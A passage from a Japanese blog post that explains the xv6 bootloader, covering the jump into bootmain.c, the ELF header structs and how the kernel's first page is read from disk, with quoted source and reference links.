&lt;h3 id=&quot;bootmaincの呼び出し&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#bootmainc%E3%81%AE%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97&quot; aria-label=&quot;bootmaincの呼び出し permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;bootmain.cの呼び出し&lt;/h3&gt;
&lt;p&gt;ここからは、&lt;code class=&quot;language-text&quot;&gt;bootmain.c&lt;/code&gt;に処理が移行します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;$start&lt;/code&gt;は初めに見た通り、&lt;code class=&quot;language-text&quot;&gt;0x7C00&lt;/code&gt;に配置されています。&lt;/p&gt;
&lt;p&gt;つまり、スタックポインタ(スタックを積むベースのアドレス)は&lt;code class=&quot;language-text&quot;&gt;0x7C00&lt;/code&gt;になるわけですね。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;# Set up the stack pointer and call into C.
movl    $start, %esp
call    bootmain&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上記より、今までの理解を図にするとこのようになるかと思います。(違ってたらごめんなさい)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://yukituna.com/wp-content/uploads/2022/01/image-15.png&quot; alt=&quot;https://yukituna.com/wp-content/uploads/2022/01/image-15.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;ちなみに以下は&lt;code class=&quot;language-text&quot;&gt;bootmain.c&lt;/code&gt;がReturnされた後の処理となるので今回は割愛します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;  # If bootmain returns (it shouldn&amp;#39;t), trigger a Bochs
  # breakpoint if running under Bochs, then loop.
  movw    $0x8a00, %ax            # 0x8a00 -&amp;gt; port 0x8a00
  movw    %ax, %dx
  outw    %ax, %dx
  movw    $0x8ae0, %ax            # 0x8ae0 -&amp;gt; port 0x8a00
  outw    %ax, %dx
spin:
  jmp     spin&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;カーネルのロード&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%81%AE%E3%83%AD%E3%83%BC%E3%83%89&quot; aria-label=&quot;カーネルのロード permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルのロード&lt;/h3&gt;
&lt;p&gt;ようやくプロテクトモードへの移行も完了し、処理が&lt;code class=&quot;language-text&quot;&gt;bootmain.c&lt;/code&gt;に切り替わりました。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;bootmain.c&lt;/code&gt;には、以下の4つの関数が定義されていますす。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;void bootmain(void)&lt;/li&gt;
&lt;li&gt;void waitdisk(void)&lt;/li&gt;
&lt;li&gt;void readsect(void *dst, uint offset)&lt;/li&gt;
&lt;li&gt;void readsect(void *dst, uint offset)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ここからは&lt;code class=&quot;language-text&quot;&gt;bootmain.c&lt;/code&gt;の挙動について追っていきます。&lt;/p&gt;
&lt;h3 id=&quot;ディスクからelfカーネルイメージをロードする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E3%81%8B%E3%82%89elf%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%82%A4%E3%83%A1%E3%83%BC%E3%82%B8%E3%82%92%E3%83%AD%E3%83%BC%E3%83%89%E3%81%99%E3%82%8B&quot; aria-label=&quot;ディスクからelfカーネルイメージをロードする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ディスクからELFカーネルイメージをロードする&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;bootmain()&lt;/code&gt;は、ディスクからELFカーネルイメージをロードするための関数です。&lt;/p&gt;
&lt;p&gt;先頭から順に見ていきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;bootmain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;elfhdr&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;elf&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;proghdr&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;ph&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;eph&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;entry&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; pa&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  elf &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;elfhdr&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// scratch space&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Read 1st page off disk&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;readseg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;elf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Is this an ELF executable?&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;magic &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; ELF_MAGIC&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// let bootasm.S handle error&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Load each program segment (ignores ph flags).&lt;/span&gt;
  ph &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;proghdr&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;elf &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phoff&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  eph &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ph &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phnum&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; ph &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; eph&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    pa &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;paddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;readseg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pa&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;off&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;memsz &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;stosb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pa &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;memsz &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Call the entry point from the ELF header.&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// Does not return!&lt;/span&gt;
  entry &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;entry&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;始めに宣言されている構造体&lt;code class=&quot;language-text&quot;&gt;elfhdr&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;proghdr&lt;/code&gt;は、どちらも&lt;code class=&quot;language-text&quot;&gt;elf.h&lt;/code&gt;で定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Format of an ELF executable file&lt;/span&gt;

&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;ELF_MAGIC&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x464C457FU&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// &quot;\x7FELF&quot; in little endian&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// File header&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;elfhdr&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uint magic&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// must equal ELF_MAGIC&lt;/span&gt;
  uchar elf&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  ushort type&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  ushort machine&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint version&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint entry&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint phoff&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint shoff&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint flags&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  ushort ehsize&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  ushort phentsize&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  ushort phnum&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  ushort shentsize&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  ushort shnum&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  ushort shstrndx&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Program section header&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;proghdr&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uint type&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint off&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint vaddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint paddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint filesz&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint memsz&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint flags&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint align&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Values for Proghdr type&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;ELF_PROG_LOAD&lt;/span&gt;           &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Flag bits for Proghdr flags&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;ELF_PROG_FLAG_EXEC&lt;/span&gt;      &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;ELF_PROG_FLAG_WRITE&lt;/span&gt;     &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;ELF_PROG_FLAG_READ&lt;/span&gt;      &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この構造体の詳細については以下のページのままなので割愛します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Executable_and_Linkable_Format&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Executable and Linkable Format - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;次の行の&lt;code class=&quot;language-text&quot;&gt;void (*entry)(void);&lt;/code&gt;では関数ポインタの宣言をしています。&lt;/p&gt;
&lt;p&gt;最終的に、ロードしたELFヘッダのエントリポイントを取得して呼び出します。&lt;/p&gt;
&lt;h3 id=&quot;ディスクからセクタを読み取る&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E3%81%8B%E3%82%89%E3%82%BB%E3%82%AF%E3%82%BF%E3%82%92%E8%AA%AD%E3%81%BF%E5%8F%96%E3%82%8B&quot; aria-label=&quot;ディスクからセクタを読み取る permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ディスクからセクタを読み取る&lt;/h3&gt;
&lt;p&gt;次は以下の箇所を見ていきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;elf &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;elfhdr&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// scratch space&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Read 1st page off disk&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;readseg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;elf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;elf = (struct elfhdr*)0x10000;&lt;/code&gt;の行は何をしているのかいまいちわかっていなかったのですが、&lt;code class=&quot;language-text&quot;&gt;0x10000&lt;/code&gt;番地からの領域を&lt;code class=&quot;language-text&quot;&gt;elfhdr&lt;/code&gt;構造体としてキャストすることで、ポインタ変数&lt;code class=&quot;language-text&quot;&gt;elf&lt;/code&gt;を通してこの領域にアクセスできるようにしています。&lt;/p&gt;
&lt;p&gt;このポインタ変数&lt;code class=&quot;language-text&quot;&gt;elf&lt;/code&gt;は、次の行で&lt;code class=&quot;language-text&quot;&gt;unsigned char&lt;/code&gt;型のポインタにキャストされ、&lt;code class=&quot;language-text&quot;&gt;readseg&lt;/code&gt;関数の第1引数として渡されています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://vmm.dev/ja/lowlevel/xv6/xv6-1.md&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 のブートローダーを読む&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;readseg((uchar*)elf, 4096, 0);&lt;/code&gt;の行では、&lt;code class=&quot;language-text&quot;&gt;(uchar*)elf&lt;/code&gt;のアドレスに4096バイトのデータをロードします。&lt;/p&gt;
&lt;p&gt;ELFヘッダのサイズが52バイトであるにも関わらず4096バイトを読み込んでいる理由については下記が参考になりました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/64795450/xv6-bootmain-loading-kernel-elf-header&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;x86 - XV6: bootmain - loading kernel ELF header - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;プログラム側からは、ELFヘッダとプログラムヘッダの組み合わせのサイズが呼び出し時点では不明なため、ELFヘッダとプログラムヘッダが4KBの範囲内に収まっていることを期待して、1ページ分のデータを読み込んでいる、という背景のようです。&lt;/p&gt;
&lt;p&gt;※x86CPUの1ページ分のサイズは4069バイト(4KB)&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/11543748/why-is-the-page-size-of-linux-x86-4-kb-how-is-that-calculated&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Why is the page size of Linux (x86) 4 KB, how is that calculated? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;readseg&lt;/code&gt;関数は以下のようなコードです。&lt;/p&gt;
